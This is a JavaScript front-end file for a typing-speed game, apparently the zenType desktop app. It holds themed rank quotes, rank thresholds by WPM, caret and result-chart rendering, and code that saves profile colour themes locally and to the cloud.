        "Chrome hands move faster than flesh and bone.",
        "Data flows through you. You are the conduit.",
        "Neural link established. Latency: Zero.",
        "Running on pure adrenaline and synthesized caffeine.",
        "The city sleeps, but you are wide awake.",
        "Override authorization accepted. Welcome, user.",
        "Your fingers are augmented. Unfair advantage?",
        "Tracing the signal... signal found. It's you.",
        "Digital shadows dance specifically for you.",
        "Your synaptic response time is off the charts.",
        "Living on the edge of the bandwidth.",
        "The firewall cannot hold you back.",
        "Cybernetic enhancements detected. Just kidding, it's you.",
        "Typing at the speed of light in a fiber optic world.",
        "You are the operating system's nightmare.",
        "Neon lights reflect in your eyes as you breach the system.",
        "Keyboard? No, this is a neural interface.",
        "Data runner. Ghost hacker. Typing god.",
        "The grid lights up when you log on.",
        "Coolant levels critical. Finger temperature rising.",
        "You don't need a mouse. You need a heat sink.",
        "Future proof. Your speed is timeless.",
        "Running diagnostics... Result: Too fast.",
        "Upload your consciousness to the cloud.",
        "Synthesized beats and rapid keystrokes.",
        "The algorithm cannot predict you.",
        "Hacking time itself.",
        "Wired reflex engaged.",
        "Digital immortality awaits.",
        "Information wants to be free. You set it loose.",
        "Navigating the datastream without a map.",
        "You are the architect of the new world.",
        // NEW COOL FLAVOR (CYBERPUNK) - 30 Lines
        "Chrome hearts don't beat. They overclock.",
        "Your reflection is just a hologram.",
        "Rain slicked streets and rapid fire keys.",
        "The interface is an extension of your mind.",
        "System override initiated. Welcome back.",
        "Lost in the neon haze of the net.",
        "Your data signature is everywhere.",
        "High voltage. High speed. High life.",
        "The corpo firewalls can't stop you.",
        "Running silent in a loud world.",
        "Your fingers are faster than the refresh rate.",
        "Living wire. Breathing code.",
        "The city lights blur when you type.",
        "Analog is dead. You are the future.",
        "Synthezoids dream of typing like you.",
        "Navigating the sprawl at light speed.",
        "Jack out? Never.",
        "The grid is your playground.",
        "Augmented reality? No, just augmented skill.",
        "Signal strength: Maximum.",
        "You are the ghost in the wiring.",
        "Static dreams and digital screams.",
        "The netrunner everyone talks about.",
        "Your bandwidth is limitless.",
        "Upload complete. downloading speed...",
        "Virtual insanity? No, virtual mastery.",
        "The simulation feels real when you type.",
        "Gliding on the information superhighway.",
        "Byte by byte, you own this city.",
        "Laser focus in a neon world."
    ],
    "PREDATOR": [
        "An apex hunter. No keystroke escapes your reach.",
        "You don't just type words. You hunt them.",
        "Lethal precision. The leaderboard is your prey.",
        "Silence before the strike. Then, devastation.",
        "You are at the top of the food chain.",
        "Merciless efficiency. Zero wasted movement.",
        "They run, but you are faster. Always faster.",
        "Instinct takes over. You don't even need to think.",
        "The hunt is on. And you are winning.",
        "Dominance established. The territory is yours.",
        "Red eyes in the darkness. You never miss.",
        "Target lock acquired. Engaging typing mode.",
        "Fear is the only thing slower than you.",
        "You track WPM like a bloodhound tracks scents.",
        "The keyboard fears you.",
        "No mercy for the backspace key.",
        "Strike hard. Strike fast. Disappear.",
        "The leaderboard is your hunting ground.",
        "You are the danger they warned about.",
        "Cold, calculated, and faster than sound.",
        "Camouflaged in the code, waiting to strike.",
        "One shot, one kill. Perfect accuracy.",
        "You smell the fear in the slow typists.",
        "The jungle of keys is your domain.",
        "Evolution has created the perfect typist.",
        "Savage speed. Primal accuracy.",
        "You don't type. You devour.",
        "The weak falter. You ascend.",
        "Trophy collected: High Score.",
        "There is no escape from your WPM.",
        "Hunt or be hunted. You chose to hunt.",
        "Your instincts are sharper than silica.",
        "A predator does not hesitate.",
        "You move in silence, you strike in thunder.",
        "The perfect organism. The perfect typist.",
        "Survival of the fastest.",
        "Your territory expands with every word.",
        "Relentless pursuit of perfection.",
        "The prey never stood a chance.",
        "You are nature's answer to the keyboard.",
        // NEW COOL FLAVOR (PREDATOR) - 30 Lines
        "The jungle is silent when you hunt.",
        "Your prey is the perfect score.",
        "Eyes forward. Claws out. Type.",
        "You don't track WPM. You track kills.",
        "The apex predator of the digital age.",
        "Silence is your weapon. Speed is your strike.",
        "You move before they even see you.",
        "Camouflage engaged. Target acquired.",
        "The weak fear the erratic. The strong fear you.",
        "No wasted movement. Only results.",
        "Your hunger for speed is endless.",
        "Dominate the ecosystem.",
        "Every keystroke is a fatal blow.",
        "The shadows are your allies.",
        "You are the danger in the dark.",
        "Survival is not enough. You must conquer.",
        "Red thermal vision: Locked on leaderboard.",
        "They run. You type.",
        "Instinct overrides thought.",
        "Pure, unadulterated focus.",
        "The hunt never ends.",
        "You are the monster under the backspace key.",
        "Savage grace.",
        "Your territory is infinite.",
        "Leave no trace. Only high scores.",
        "The forest goes quiet when you log in.",
        "You are the shark in the data stream.",
        "Blood in the water. Speed in the veins.",
        "Ruthless efficiency.",
        "The alpha typist."
    ],
    "SINGULARITY": [
        "You have transcended the keyboard. You are pure energy.",
        "Physics no longer apply to your fingers.",
        "You have merged with the infinite data stream.",
        "Speed is an illusion. You are already there.",
        "A god amongst mortals. Pure digital ascendance.",
        "The universe types through you.",
        "Beyond rank. Beyond measure. Infinite.",
        "You are the event horizon. There is no return.",
        "Time slows down when you begin to type.",
        "Welcome to the void. You are its master.",
        "Error: WPM exceeds calculated maximums.",
        "You are the alpha and the omega of typing.",
        "Reality bends to accommodate your speed.",
        "One with the code. One with the machine.",
        "Ascension complete. Awaiting new instructions.",
        "The speed of thought is your only limit.",
        "You are everywhere and nowhere at once.",
        "Data is not processed. It is absorbed.",
        "Infinite possibilities in every keystroke.",
        "You have gazed into the abyss, and it typed back.",
        "Gravity cannot hold your fingers down.",
        "You are the big bang of the typing world.",
        "Matter, Energy, WPM. It is all the same.",
        "The simulation is breaking under your speed.",
        "You do not need a keyboard where you are going.",
        "Pure consciousness expressed as text.",
        "The timeline branches with every word you type.",
        "You have reached the end of the internet. Turn back.",
        "Absolute zero latency. Absolute perfection.",
        "You are the code that writes itself.",
        "A singularity has no beginning and no end.",
        "You are typing in dimensions others cannot see.",
        "The universe is compiling your code.",
        "Infinite WPM is theoretically possible. You proved it.",
        "Bending space-time with keystrokes.",
        "You have become the algorithm.",
        "Welcome to the next level of existence.",
        "Finite limits do not apply to you.",
        "The cursor is a fixed point. You move the universe.",
        "Rank: Undefined. Power: Unlimited.",
        // NEW COOL FLAVOR (SINGULARITY) - 30 Lines
        "You are typing the universe into existence.",
        "Matter is slow. You are light.",
        "The event horizon cannot hold you.",
        "A supernova of keystrokes.",
        "Time has no meaning at this speed.",
        "You are the constant in a chaotic equation.",
        "The cosmos aligns with your fingers.",
        "Reality is just a suggestion to you.",
        "Typing across dimensions.",
        "You have become pure energy.",
        "The stars blink in time with your typing.",
        "Gravity bows to your WPM.",
        "You are the big bang.",
        "Infinite density. Infinite speed.",
        "The void stares back, and it blinks.",
        "Ascending beyond the physical plane.",
        "Your consciousness is uploaded.",
        "The multiverse branches with every word.",
        "You are the end of history.",
        "Space-time tears when you hit enter.",
        "A black hole of productivity.",
        "The observer effect: You change what you type.",
        "Quantum superposition. You are everywhere.",
        "Entropy reverses in your presence.",
        "You are the final line of code.",
        "The omega point achieved.",
        "Transcending the limits of silicon.",
        "You are the light at the end of the tunnel.",
        "The universe is compiling...",
        "Hello, World. I am the creator."
    ]
};

function getRankTitle(wpm) {
    let rank = { title: "WANDERER", color: "#9ca3af" };

    if (wpm >= 120) rank = { title: "SINGULARITY", color: "#ffd700" };
    else if (wpm >= 100) rank = { title: "PREDATOR", color: "#f43f5e" };
    else if (wpm >= 80) rank = { title: "CYBERPUNK", color: "#bc13fe" };
    else if (wpm >= 60) rank = { title: "SAMURAI", color: "#3b82f6" };
    else if (wpm >= 40) rank = { title: "GLITCH", color: "#39ff14" };
    else if (wpm >= 20) rank = { title: "RONIN", color: "#2dd4bf" };

    // Pick random quote
    const quotes = rankQuotes[rank.title] || rankQuotes["WANDERER"];
    rank.desc = quotes[Math.floor(Math.random() * quotes.length)];

    return rank;
}

function animateValue(obj, start, end, duration, suffix = "") {
    let startTimestamp = null;
    const step = (timestamp) => {
        if (!startTimestamp) startTimestamp = timestamp;
        const progress = Math.min((timestamp - startTimestamp) / duration, 1);
        // EaseOutExpo
        const ease = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);

        obj.innerHTML = Math.floor(ease * (end - start) + start) + suffix;
        if (progress < 1) {
            window.requestAnimationFrame(step);
        } else {
            obj.innerHTML = end + suffix; // Ensure final value
        }
    };
    window.requestAnimationFrame(step);
}

function updateCaretPosition() {
    const caret = document.getElementById('caret');
    const caretTrail = document.getElementById('caret-trail');
    const currentWordEl = document.getElementById(`word-${state.currWordIndex}`);
    if (!currentWordEl || !caret) return;

    const typedLen = UI.input.value.length;
    const letters = currentWordEl.querySelectorAll('.letter');
    let targetLeft = 0;
    let targetTop = 0;

    if (typedLen === 0) {
        targetLeft = currentWordEl.offsetLeft;
        targetTop = currentWordEl.offsetTop;
    } else if (typedLen < letters.length) {
        const targetLetter = letters[typedLen];
        targetLeft = currentWordEl.offsetLeft + targetLetter.offsetLeft;
        targetTop = currentWordEl.offsetTop + targetLetter.offsetTop;
    } else {
        const lastLetter = letters[letters.length - 1];
        targetLeft = currentWordEl.offsetLeft + lastLetter.offsetLeft + lastLetter.offsetWidth;
        targetTop = currentWordEl.offsetTop + lastLetter.offsetTop;
    }

    caret.style.transform = `translate(${targetLeft}px, ${targetTop}px)`;
    const caretStyle = userConfig.caretStyle || 'line';

    // Carets that animate #caret itself instead of ::before
    const ignoreBlink = ['heartbeat', 'pulse', 'neon', 'ripple', 'breathe', 'bounce', 'glitch', 'static', 'wave', 'comet'];

    if (!ignoreBlink.includes(caretStyle)) {
        caret.style.animation = 'none';
        void caret.offsetWidth;
        caret.style.animation = 'blink 1s infinite';
    }

    // Trail follows with delay (CSS transition handles the smooth lag)
    if (caretTrail) {
        caretTrail.style.transform = `translate(${targetLeft}px, ${targetTop}px)`;
    }
}

document.addEventListener('keydown', (e) => {
    // Don't steal focus if user is typing in another field (like login)
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        if (e.target !== UI.input) return;
    }

    // Don't focus if auth modal is open
    if (!document.getElementById('auth-modal').classList.contains('hidden')) return;

    if (e.key !== 'Tab') UI.input.focus();
    if (e.key === 'Tab') {
        e.preventDefault();
        clearInterval(state.timerInterval);
        initGame();
    }
});

// --- INIT ---
initTheme();
initGame();
initParticles();
initKeypressParticles();
// Set initial Discord presence
discordPresence.currentState = '_boot';
discordPresence.setIdle();
initTrackSelector(); // Initialize UI

// --- PERFORMANCE: Pause all rendering when app is hidden/minimized ---
// Use Tauri window API directly since visibilitychange doesn't work in desktop apps
(async () => {
    try {
        const { getCurrentWindow } = await import('@tauri-apps/api/window');
        const appWindow = getCurrentWindow();
        appWindow.onFocusChanged(({ payload: focused }) => {
            if (!focused) {
                // Pause background canvas effect
                if (effectAnimId) {
                    cancelAnimationFrame(effectAnimId);
                    effectAnimId = null;
                }
                // Pause keypress particle loop
                if (keypressAnimId) {
                    cancelAnimationFrame(keypressAnimId);
                    keypressAnimId = null;
                }
                // Pause video wallpaper to save GPU decode cycles
                if (UI.bgVideo && !UI.bgVideo.paused) {
                    UI.bgVideo.pause();
                    UI.bgVideo._wasPausedByVisibility = true;
                }
                // Pause ALL CSS animations to stop GPU repaints (caret blink etc)
                document.body.classList.add('app-paused');
            } else {
                // Resume background canvas effect
                initParticles();
                // Resume keypress particles if any were mid-flight
                if (keyParticles.length > 0 && !keypressAnimId) {
                    keypressAnimId = requestAnimationFrame(loopKeypressParticles);
                }
                // Resume video wallpaper
                if (UI.bgVideo && UI.bgVideo._wasPausedByVisibility) {
                    UI.bgVideo.play();
                    UI.bgVideo._wasPausedByVisibility = false;
                }
                // Resume CSS animations
                document.body.classList.remove('app-paused');
            }
        });
    } catch (e) {
        // Not in Tauri environment, skip
    }
})();
function drawResultChart(data) {
    const canvas = document.getElementById('results-chart');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    // Detect high DPI
    const dpr = window.devicePixelRatio || 1;
    const rect = canvas.getBoundingClientRect();

    canvas.width = rect.width * dpr;
    canvas.height = rect.height * dpr;

    ctx.scale(dpr, dpr);

    const width = rect.width;
    const height = rect.height;

    ctx.clearRect(0, 0, width, height);

    // If no data, show a flat line
    if (!data || data.length === 0) data = [0, 0];
    if (data.length === 1) data = [data[0], data[0]];

    const maxVal = Math.max(...data, 60);
    const padding = 15;
    const graphWidth = width - padding * 2;
    const graphHeight = height - padding * 2;

    // Get Theme Color
    let themeColor = userConfig.effectColor || userConfig.particleColor || '#ffd700';

    const points = data.map((val, i) => {
        return {
            x: padding + (i / (data.length - 1)) * graphWidth,
            y: height - padding - (val / maxVal) * graphHeight
        };
    });

    // Draw Smooth Curve
    ctx.beginPath();
    ctx.moveTo(points[0].x, points[0].y);

    for (let i = 0; i < points.length - 1; i++) {
        const p0 = points[i];
        const p1 = points[i + 1];
        const midX = (p0.x + p1.x) / 2;
        const midY = (p0.y + p1.y) / 2;
        // Quadratic Bezier to midpoint for smoothness
        const cpX = (p0.x + p1.x) / 2;
        // Actually, standard smoothing: use control point as p0? No.
        // Simple smoothing: Curve from p0 to midpoint of p0-p1?
        // Better: Curve to midpoints.
        if (i === 0) {
            ctx.lineTo(p0.x, p0.y);
        }
        ctx.quadraticCurveTo(p0.x, p0.y, midX, midY);
    }
    // Connect to last point
    ctx.lineTo(points[points.length - 1].x, points[points.length - 1].y);

    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';
    ctx.lineWidth = 3;
    ctx.strokeStyle = themeColor;

    // Add Glow
    ctx.shadowBlur = 15;
    ctx.shadowColor = themeColor;
    ctx.stroke();

    // Reset shadow for fill
    ctx.shadowBlur = 0;

    // Fill Gradient
    ctx.lineTo(width - padding, height - padding);
    ctx.lineTo(padding, height - padding);
    ctx.closePath();

    const grad = ctx.createLinearGradient(0, 0, 0, height);
    grad.addColorStop(0, hexToRgba(themeColor, 0.5));
    grad.addColorStop(1, hexToRgba(themeColor, 0.0));
    ctx.fillStyle = grad;
    ctx.fill();
}

// Helper for hex to rgba
function hexToRgba(hex, alpha) {
    let c;
    if (/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)) {
        c = hex.substring(1).split('');
        if (c.length == 3) {
            c = [c[0], c[0], c[1], c[1], c[2], c[2]];
        }
        c = '0x' + c.join('');
        return 'rgba(' + [(c >> 16) & 255, (c >> 8) & 255, c & 255].join(',') + ',' + alpha + ')';
    }
    return `rgba(255, 215, 0, ${alpha})`; // fallback gold
}

window.addEventListener('resize', updateCaretPosition);

// ══════════════════════════════════════════════════════════
// SETTINGS TAB LOGIC (Explicit Handling)
// ══════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
    // 1. Tab Switching
    const tabs = document.querySelectorAll('.settings-tab');
    const panes = document.querySelectorAll('.tab-pane');

    if (tabs.length > 0) {
        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                // Deactivate all
                tabs.forEach(t => t.classList.remove('active'));
                panes.forEach(p => p.classList.remove('active'));

                // Activate clicked
                tab.classList.add('active');

                // Show Pane
                const targetId = `tab-${tab.dataset.tab}`;
                const targetPane = document.getElementById(targetId);
                if (targetPane) {
                    targetPane.classList.add('active');
                }
            });
        });
    }

    // 2. Profile Color Logic
    const primaryInput = document.getElementById('profile-primary-input');
    const primaryPicker = document.getElementById('profile-primary-picker');
    const primaryPreview = document.getElementById('profile-primary-preview');

    const accentInput = document.getElementById('profile-accent-input');
    const accentPicker = document.getElementById('profile-accent-picker');
    const accentPreview = document.getElementById('profile-accent-preview');

    // Sync Helper
    function setupColorSync(textInput, picker, preview, onChange) {
        if (!textInput || !picker || !preview) return;

        // Click preview to open picker
        preview.addEventListener('click', () => picker.click());

        // Picker Change
        picker.addEventListener('input', (e) => {
            const val = e.target.value;
            textInput.value = val;
            preview.style.background = val;
            if (onChange) onChange(val);
        });

        // Text Input Change
        textInput.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val.startsWith('#') && val.length === 7) {
                picker.value = val;
                preview.style.background = val;
                if (onChange) onChange(val);
            }
        });
    }

    // Update Custom Button Border
    function updateCustomBorder(color) {
        const customBtn = document.getElementById('profile-mode-custom');
        if (customBtn) {
            customBtn.style.setProperty('--btn-active-color', color);
            // Optional: Update shadow/background tint too for full effect
            customBtn.style.boxShadow = `0 0 20px ${hexToRgba(color, 0.2)}`;
            customBtn.style.background = hexToRgba(color, 0.05);
        }
    }

    setupColorSync(primaryInput, primaryPicker, primaryPreview, updateCustomBorder);
    setupColorSync(accentInput, accentPicker, accentPreview);

    // Glow Inputs
    const glowPrimaryInput = document.getElementById('profile-glow-primary-input');
    const glowPrimaryPicker = document.getElementById('profile-glow-primary-picker');
    const glowPrimaryPreview = document.getElementById('profile-glow-primary-preview');


    setupColorSync(glowPrimaryInput, glowPrimaryPicker, glowPrimaryPreview);


    // Apply Theme Function
    function applyProfileTheme(theme, targetElement = null) {
        // Fix: Use targetElement if provided (for public profiles), else global root
        const root = targetElement || document.documentElement;

        // Default Colors
        const defPrimary = '#ffd700';
        const defAccent = '#ffb800';
        const defGlowPrimary = 'rgba(255, 215, 0, 0.15)';


        if (theme.mode === 'custom') {
            root.style.setProperty('--profile-primary', theme.primary || defPrimary);
            root.style.setProperty('--profile-accent', theme.accent || defAccent);
            root.style.setProperty('--profile-glow-primary', theme.glowPrimary || defGlowPrimary);

        } else {
            // Default Mode
            root.style.setProperty('--profile-primary', defPrimary);
            root.style.setProperty('--profile-accent', defAccent);
            root.style.setProperty('--profile-glow-primary', defGlowPrimary);

        }
    }

    // Save Button
    const saveBtn = document.getElementById('save-profile-theme-btn');
    if (saveBtn) {
        saveBtn.addEventListener('click', () => {
            const primary = primaryInput ? primaryInput.value : '#ffd700';
            const accent = accentInput ? accentInput.value : '#ffb800';
            const glowPrimary = glowPrimaryInput ? glowPrimaryInput.value : 'rgba(255, 215, 0, 0.15)';


            // Check active mode
            const activeBtn = document.querySelector('.layout-btn.active');
            let mode = 'default';
            if (activeBtn && activeBtn.id === 'profile-mode-custom') {
                mode = 'custom';
            }

            // Save to LocalStorage
            const themeData = {
                primary: primary,
                accent: accent,
                glowPrimary: glowPrimary,

                mode: mode
            };
            localStorage.setItem('zenType_profileTheme', JSON.stringify(themeData));

            // Apply Immediately
            if (window.applyProfileTheme) window.applyProfileTheme(themeData);

            // Save to Cloud (Supabase)
            console.log("DEBUG: script.js - Attempting to save theme:", themeData);
            if (window.saveUserTheme) {
                console.log("DEBUG: script.js - Found saveUserTheme, calling it...");
                window.saveUserTheme(themeData);
            } else {
                console.error("DEBUG: script.js - window.saveUserTheme is UNDEFINED!");
                alert("Error: Could not save to cloud. Refresh and try again.");
            }

            // Visual Feedback
            saveBtn.innerHTML = '<i class="ri-check-line"></i> Saved!';
            setTimeout(() => {
                saveBtn.innerHTML = '<i class="ri-save-line"></i> Save Theme';
            }, 2000);
        });
    }

    // Layout Toggle
    const layoutBtns = document.querySelectorAll('.layout-btn');
    const customOptions = document.getElementById('profile-custom-options');

    function toggleCustomInputs(isCustom) {
        if (!customOptions) return;
        if (isCustom) {
            customOptions.style.opacity = '1';
            customOptions.style.pointerEvents = 'auto';
        } else {
            customOptions.style.opacity = '0.5';
            customOptions.style.pointerEvents = 'none';
        }
    }

    layoutBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            layoutBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            // Unlock inputs if Custom is selected
            toggleCustomInputs(btn.id === 'profile-mode-custom');
        });
    });

    // Load Defaults on Start
    const savedTheme = JSON.parse(localStorage.getItem('zenType_profileTheme')) || { mode: 'default', primary: '#ffd700', accent: '#ffb800' };

    // Set Inputs
    if (primaryInput) {
        primaryInput.value = savedTheme.primary;
        primaryPicker.value = savedTheme.primary;
        primaryPreview.style.background = savedTheme.primary;
        // Init Border
        updateCustomBorder(savedTheme.primary);
    }
    if (accentInput) {
        accentInput.value = savedTheme.accent;
        accentPicker.value = savedTheme.accent;
        accentPreview.style.background = savedTheme.accent;
    }
    if (glowPrimaryInput) {
        const val = savedTheme.glowPrimary || 'rgba(255, 215, 0, 0.15)';
        glowPrimaryInput.value = val;
        // Picker only supports hex, so we don't set it if it's rgba
        if (val.startsWith('#')) glowPrimaryPicker.value = val;
        glowPrimaryPreview.style.background = val;
    }


    // Set Active Button
    layoutBtns.forEach(b => b.classList.remove('active'));
    const targetId = savedTheme.mode === 'custom' ? 'profile-mode-custom' : 'profile-mode-default';
    const targetBtn = document.getElementById(targetId);
    if (targetBtn) targetBtn.classList.add('active');

    // Quick Palettes
    const palettePresets = document.querySelectorAll('.palette-preset');
    if (palettePresets) {
        palettePresets.forEach(preset => {
            preset.addEventListener('click', () => {
                const pColor = preset.getAttribute('data-primary');
                const aColor = preset.getAttribute('data-accent');

                // Set Inputs
                if (primaryInput && primaryPicker && primaryPreview) {
                    primaryInput.value = pColor;
                    primaryPicker.value = pColor;
                    primaryPreview.style.background = pColor;
                    // Trigger live update
                    if (updateCustomBorder) updateCustomBorder(pColor);
                }

                if (accentInput && accentPicker && accentPreview) {
                    accentInput.value = aColor;
                    accentPicker.value = aColor;
                    accentPreview.style.background = aColor;
                }

                // Force Switch to Custom
                const customBtn = document.getElementById('profile-mode-custom');
                if (customBtn) customBtn.click();
            });
        });
    }

    // Apply CSS
    if (window.applyProfileTheme) {
        window.applyProfileTheme(savedTheme);
    }

});

// ══════════════════════════════════════════════════════════
// GLOBAL THEME UTILS
// ══════════════════════════════════════════════════════════
window.applyProfileTheme = function (theme, targetElement = null) {
    // If targetElement is provided, we use it. Otherwise, global root.
    const root = targetElement || document.documentElement;

    // Default Colors (Gold/Orange)
    const defPrimary = '#ffd700';
    const defAccent = '#ffb800';
    const defGlowPrimary = 'rgba(255, 215, 0, 0.15)';
    const defGlowAccent = 'rgba(255, 215, 0, 0.05)';

    // Helper: deciding values
    let primary, accent, glowPrimary;

    if (theme && theme.mode === 'custom') {
        primary = theme.primary || defPrimary;
        accent = theme.accent || defAccent;
        glowPrimary = theme.glowPrimary || defGlowPrimary;
    } else {
        primary = defPrimary;
        accent = defAccent;
        glowPrimary = defGlowPrimary;
    }

    // Apply
    root.style.setProperty('--profile-primary', primary);
    root.style.setProperty('--profile-accent', accent);
    root.style.setProperty('--profile-glow-primary', glowPrimary);
};

// --- DISABLE DEV TOOLS & CONTEXT MENU ---
document.addEventListener('contextmenu', event => event.preventDefault());

document.addEventListener('keydown', event => {
    if (
        event.key === 'F12' ||
        (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'J' || event.key === 'C')) ||
        (event.ctrlKey && event.key === 'U')
    ) {
        event.preventDefault();
    }
});

